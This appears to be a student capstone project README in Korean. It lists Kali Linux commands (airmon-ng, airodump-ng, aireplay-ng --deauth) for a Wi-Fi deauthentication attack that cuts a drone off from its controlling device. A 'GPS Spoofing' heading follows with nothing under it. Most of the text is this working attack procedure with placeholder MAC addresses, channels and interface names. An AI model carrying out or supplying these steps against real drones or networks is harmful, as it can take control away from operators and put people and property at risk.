캡스톤디자인I 코드
=================


1.인증해제 공격
---------------

무선 랜카드가 장착된 Kali Linux 환경에서 행한다.

```bash
airmon-ng check kill
iwconfig
```


무선랜 이름 확인

```bash
airmon-ng start [무선랜 이름]
airodump-ng [무선랜 이름] --essid-regex [드론의 MAC주소] -w [저장 파일명]
```


제어 기기 MAC 확인

```bash
iwconfig [무선랜 이름] channel [드론 AP의 채널]
aireplay-ng --deauth [공격 시간] -a [드론의 MAC주소] -c [제어 기기의 MAC주소] [무선랜 이름]
```



2.GPS Spoofing
---------------


